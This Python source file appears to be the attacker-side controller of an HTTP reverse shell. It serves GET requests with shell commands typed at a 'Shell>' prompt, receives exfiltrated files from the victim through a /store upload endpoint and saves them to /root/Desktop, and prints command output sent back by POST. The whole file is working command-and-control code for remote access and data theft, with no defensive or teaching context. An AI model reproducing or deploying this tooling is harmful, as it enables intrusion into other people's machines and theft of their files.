from http.server import BaseHTTPRequestHandler,HTTPServer
import os,cgi,ntpath

HOST_NAME = "192.168.0.10"
PORT_NUMBER = 80

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(s):
        command = input("Shell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command.encode())

    def do_POST(s):
        if s.path == '/store':
            try:
                ctype,pdict = cgi.parse_header(s.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage( fp = s.rfile, headers = s.headers, environ = {'REQUEST_METHOD':'POST'} )
                else:
                    print("[-] Unexpected POST request.")
                fs_up = fs['file']
                name = ntpath.basename(fs['path'].value.decode())
                print(name)
                with open('/root/Desktop/{0}'.format(name), 'wb') as o:
                    o.write( fs_up.file.read() )
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print(e)

            return
        
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = HTTPServer
    httpd = server_class((HOST_NAME,PORT_NUMBER), MyHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated.")
        httpd.server_close()
